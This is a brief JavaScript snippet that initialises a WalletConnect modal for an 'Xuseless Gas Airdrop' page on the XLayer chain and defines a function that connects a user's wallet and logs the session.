import { ethers } from "ethers";
import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";

// 初始化 WalletConnect
const modal = new WalletConnectModalSign({
  projectId: "310356f4b71b2f49dee3048bcf68240d",
  metadata: {
    name: "Xuseless Gas Airdrop",
    description: "XLayer Gas 空投申请",
    url: "https://xuseless.netlify.app",
    icons: ["https://xuseless.netlify.app/icon.png"]
  }
});

window.connectWallet = async () => {
  const session = await modal.connect({
    requiredNamespaces: {
      eip155: {
        methods: ["eth_sendTransaction", "personal_sign"],
        chains: ["eip155:196"],
        events: ["accountsChanged", "chainChanged"]
      }
    }
  });
  console.log("Wallet connected:", session);
};
